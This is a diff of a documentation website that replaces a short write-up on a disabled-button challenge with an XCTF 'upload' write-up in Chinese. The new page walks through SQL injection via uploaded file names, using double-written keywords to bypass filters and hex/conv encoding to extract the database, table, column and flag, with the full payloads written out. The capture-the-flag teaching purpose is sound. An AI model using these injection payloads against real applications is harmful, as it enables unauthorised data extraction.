@@ -13,7 +13,7 @@
         <meta name="description" content="drkless docs">
       
       
-        <link rel="canonical" href="https://darkless.cn/my-docs/XCTF-web-disable_buttom/">
+        <link rel="canonical" href="https://darkless.cn/my-docs/XCTF-web-upload/">
       
       
         <meta name="author" content="hand">
@@ -42,7 +42,7 @@
     
     
       
-        <title>disable_buttom - DarkLess</title>
+        <title>upload - DarkLess</title>
       
     
     
@@ -136,7 +136,7 @@
             </span>
             <span class="md-header-nav__topic">
               
-                disable_buttom
+                upload
               
             </span>
           
@@ -216,7 +216,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../XCTF-primary-writeup/" class="md-tabs__link md-tabs__link--active">
+        <a href="../XCTF-primary-writeup/" class="md-tabs__link">
           XCTF初级wp
         </a>
       
@@ -229,7 +229,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../XCTF-challenge-writeup/" class="md-tabs__link">
+        <a href="../XCTF-challenge-writeup/" class="md-tabs__link md-tabs__link--active">
           XCTF高级wp
         </a>
       
@@ -432,12 +432,10 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+  <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
     
     <label class="md-nav__link" for="nav-3">
       XCTF初级wp
@@ -525,52 +523,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        disable_buttom
-      </label>
-    
-    <a href="./" title="disable_buttom" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../XCTF-web-disable_buttom/" title="disable_buttom" class="md-nav__link">
       disable_buttom
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary">
-  
-  
-  
-    <label class="md-nav__title" for="__toc">目录</label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    题目
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    思路
-  </a>
-  
-</li>
-      
-      
-      
-      
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -655,10 +612,12 @@
       
       
 
+  
 
-  <li class="md-nav__item md-nav__item--nested">
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
     
     <label class="md-nav__link" for="nav-4">
       XCTF高级wp
@@ -746,11 +705,52 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../XCTF-web-upload/" title="upload" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        upload
+      </label>
+    
+    <a href="./" title="upload" class="md-nav__link md-nav__link--active">
       upload
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    题目描述
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
         
@@ -791,7 +791,7 @@
       
         <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
-    题目
+    题目描述
   </a>
   
 </li>
@@ -820,22 +820,68 @@
               
                 
                 
-                  <h1>disable_buttom</h1>
+                  <h1>upload</h1>
                 
-                <p>XCTF第六题disable_buttom  write up</p>
-<h2 id="_1">题目</h2>
-<p>X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p>
+                <h2 id="_1">题目描述</h2>
+<p>无</p>
 <h2 id="_2">思路</h2>
-<p>打开页面，发现按钮无法点击。</p>
-<p><img alt="20190827125357.png" src="https://i.loli.net/2019/08/27/ktUKYqQO98L5He6.png" /></p>
-<p>F12查看源码</p>
-<p><img alt="20190827125538.png" src="https://i.loli.net/2019/08/27/ywVTMsa4UzrjfeB.png" /></p>
-<p>发现input标签有个disable属性</p>
+<p>打开题目，是一个注册登录页面，可能有人会想到注入或者绕过等逻辑漏洞，可惜都不是。</p>
+<p><img alt="20190830222800.png" src="https://raw.githubusercontent.com/handbye/images/master/20190830222800.png" /></p>
+<p>那就注册一个用户登录试试吧。</p>
+<p><img alt="20190830223001.png" src="https://raw.githubusercontent.com/handbye/images/master/20190830223001.png" /></p>
+<p>是一个文件上传页面，先上传一个文件试试。</p>
+<p><img alt="20190830223207.png" src="https://raw.githubusercontent.com/handbye/images/master/20190830223207.png" /></p>
+<p>图片可以正常上传，并显示到了页面中。</p>
+<p><img alt="20190830223253.png" src="https://raw.githubusercontent.com/handbye/images/master/20190830223253.png" /></p>
+<p>上传php脚本，提示文件扩展不正确，看来是对文件后缀做了过滤的，经过测试只能上传jpg后缀的文件，看来是白名单过滤。</p>
+<p>值得注意的是我们上传的文件名都会显示到页面上，这个过程可能是经过数据库查询的。意思是我们上传的文件名会存放到数据库中，猜测插入语句为：</p>
+<pre><code class="sql">insert into 表名('filename',...) values('你上传的文件名',...);
+</code></pre>
+
+<p>这里的<code>filename</code>是可控的，我们只有尝试构造filename进行注入。</p>
+<p>需注意的是，系统将select、from等关键字都进行了过滤。</p>
+<p><img alt="20190830224921.png" src="https://raw.githubusercontent.com/handbye/images/master/20190830224921.png" /></p>
+<p>考虑双写绕过：</p>
+<p><img alt="20190830225014.png" src="https://raw.githubusercontent.com/handbye/images/master/20190830225014.png" /></p>
+<ul>
+<li>采用<code>sselectelect database()</code>进行注入，发现页面返回0</li>
+<li>采用<code>selecselectt substr(dAtabase(),1,12)</code>进行注入，页面依旧返回0</li>
+<li>采用<code>selecselectt substr(hex(dAtabase()),1,12))</code>进行注入，页面返回7765625，本应返回7765625f7570，但遇到’f‘导致截断，所以需要conv转成十进制输出</li>
+</ul>
 <blockquote>
-<p>disabled 属性规定应该禁用的 <code>&lt;input&gt;</code>元素。被禁用的 input 元素是无法使用和无法点击的。</p>
+<p>substr需要进行长度限制：不限制长度会导致返回值太大，系统使用科学计数法（xx e xxxxx）表示。</p>
 </blockquote>
-<p>删除源码中的disable属性，按钮即可点击，然后得到Flag。</p>
-<p><img alt="20190827125908.png" src="https://i.loli.net/2019/08/27/lHt6GMmXSz8DWVx.png" /></p>
+<p>至于上面那个为啥遇到f会导致截断，以及为什么会想到将16进制转为10禁止输出，我也没相通，哪位大佬知道还希望指导下。</p>
+<p>基于上面的原因，我们需要构造下面这句话来进行注入：</p>
+<pre><code class="sql">文件名'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg
+</code></pre>
+
+<p>拼接后的sql语句为：</p>
+<pre><code class="sql">...values('文件名'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg',...);
+</code></pre>
+
+<blockquote>
+<p>CONV(n,from_radix,to_radix)：用于将n从from_radix进制转到to_radix进制
+substr(str,start,length)：将str从start长度为length分割
+hex(str)：将str转成十六进制</p>
+</blockquote>
+<p>知道了注入语句，接下来就开始进行注入操作：</p>
+<pre><code class="sql">1. 注入库名：
+file_name' +(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg
+# 得到数字 131277325825392 转换为16进制为 7765625f7570 转换为文字为 web_up
+file_name' +(selselectect conv(substr(hex(database()),13,12),16,10))+ '.jpg
+# 得到数字 1819238756 转换为16禁止为 6c6f6164 转换为文字为 load
+# 下面的注入方式类似，不在细述
+2. 注入表名：
+file_name'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg
+# 得到表名 hello_flag_is_here
+3. 注入字段：
+file_name'+(seleselectct+conv(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 1,1)),1,12),16,10))+'.jpg
+# 得到字段 i_am_flag
+4. 获取数据：
+file_name'+(seleselectct+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg
+#得到Flag: !!_@m_Th.e_F!lag
+</code></pre>
                 
                   
                 
@@ -856,7 +902,7 @@
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../XCTF-web-cookie/" title="cookie" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../XCTF-web-NaNNaNNaNNaN-Batman/" title="NaNNaNNaNNaN-Batman" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -865,19 +911,19 @@
                 <span class="md-footer-nav__direction">
                   上一页
                 </span>
-                cookie
+                NaNNaNNaNNaN-Batman
               </span>
             </div>
           </a>
         
         
-          <a href="../XCTF-web-simplejs/" title="simple_js" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../XCTF-web-PHP2/" title="PHP2" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   下一页
                 </span>
-                simple_js
+                PHP2
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
